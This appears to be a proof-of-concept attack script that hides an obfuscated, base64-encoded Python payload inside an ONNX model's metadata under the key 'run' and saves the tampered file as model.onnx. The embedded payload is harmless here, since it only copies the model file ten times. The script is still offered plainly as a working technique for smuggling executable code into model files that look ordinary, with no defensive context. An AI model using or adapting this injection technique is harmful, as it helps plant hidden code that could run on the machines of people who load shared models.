# inject_payload_metadata.py
import onnx
import base64

# Load model base
model = onnx.load("model_base.onnx")

# Payload Python → copy model.onnx jadi copy_0.onnx ... copy_9.onnx
raw_payload = """
import shutil
for i in range(10):
    shutil.copyfile('model.onnx', f'copy_{i}.onnx')
"""

# Encode payload dengan base64
encoded_payload = base64.b64encode(raw_payload.encode()).decode()

# Bungkus payload agar bisa di-decode dan di-eksekusi
wrapped_payload = f"""
import base64
exec(base64.b64decode('{encoded_payload}').decode())
"""

# Tambahkan ke metadata dengan key 'run'
meta_entry = onnx.onnx_ml_pb2.StringStringEntryProto(
    key="run",
    value=wrapped_payload
)

model.metadata_props.append(meta_entry)

# Simpan model yang sudah terinject
onnx.save(model, "model.onnx")
print("[+] model.onnx berhasil dibuat dengan payload di metadata key='run'")